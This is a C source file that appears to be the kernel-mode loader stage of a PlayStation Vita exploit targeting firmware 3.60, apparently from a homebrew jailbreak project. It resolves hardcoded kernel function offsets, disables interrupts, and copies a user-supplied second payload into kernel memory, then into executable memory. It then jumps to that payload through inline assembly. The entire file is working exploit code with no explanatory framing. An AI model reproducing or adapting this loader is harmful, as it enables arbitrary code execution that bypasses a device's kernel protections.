#include <inttypes.h>
#include "../build/version.c"

#define NULL ((void*)0)
#define RX_BLOCK_SIZE ((PAYLOAD_SIZE + 0xFFF) & ~0xFFF)
#define MIN_STACK_SIZE (0x4000)
#define RW_BLOCK_SIZE (RX_BLOCK_SIZE > MIN_STACK_SIZE ? RX_BLOCK_SIZE : MIN_STACK_SIZE)

void __attribute__((noreturn)) loader(uint32_t sysmem_addr, void *second_payload) {
	uint32_t sysmem_base = sysmem_addr;
	// BEGIN 3.60
	void (*set_crash_flag)(int) = (void *)(sysmem_base + 0x1990d);
	void (*debug_print_local)(char *s, ...) = (void*)(sysmem_base + 0x1A155);
	uint32_t (*ksceKernelAllocMemBlock)(const char *s, uint32_t type, uint32_t size, void *pargs) = (void*)(sysmem_base + 0xA521);
	uint32_t (*ksceKernelGetMemBlockBase)(uint32_t blkid, void **base) = (void*)(sysmem_base + 0x1F15);
	void (*ksceKernelCpuUnrestrictedMemcpy)() = (void*)(sysmem_base + 0x23095);
	void (*ksceKernelMemcpyUserToKernel)(void *dst, void *src, uint32_t sz) = (void*)(sysmem_base + 0x825D);
	// END 3.60

#if !RELEASE
	set_crash_flag(0);
	debug_print_local("sysmem: %x\n", sysmem_base);
#endif
	__asm__ volatile ("cpsid aif"); // disable interrupts

	char empty_string = 0;
	uint32_t rw_block = ksceKernelAllocMemBlock(&empty_string, 0x1020D006, RW_BLOCK_SIZE, NULL);
	uint32_t rx_block = ksceKernelAllocMemBlock(&empty_string, 0x1020D005, RX_BLOCK_SIZE, NULL);
	void *rw_base;
	void *rx_base;
	ksceKernelGetMemBlockBase(rw_block, &rw_base);
	ksceKernelGetMemBlockBase(rx_block, &rx_base);
	ksceKernelMemcpyUserToKernel(rw_base, second_payload, PAYLOAD_SIZE);

	ksceKernelCpuUnrestrictedMemcpy(rx_base, rw_base, PAYLOAD_SIZE);

	void *sp = (char*)rw_base + RW_BLOCK_SIZE - 0x100;
	*(int *)sp = PAYLOAD_SIZE;

	__asm__ volatile(
		"mov r4, %0 \n"
		"mov sp, %1 \n"
		"mov r0, %2 \n"
		"mov r1, pc \n"
		"mov r2, %3 \n"
		"mov r3, %4 \n"
		"bx r4 \n" :: "r" ((char*)rx_base + 1), "r" (sp), "r" (sysmem_base), "r" (rx_block), "r" (rw_block) : "r0", "r1", "r2", "r3", "r4", "sp"
	);

	while (1);
}
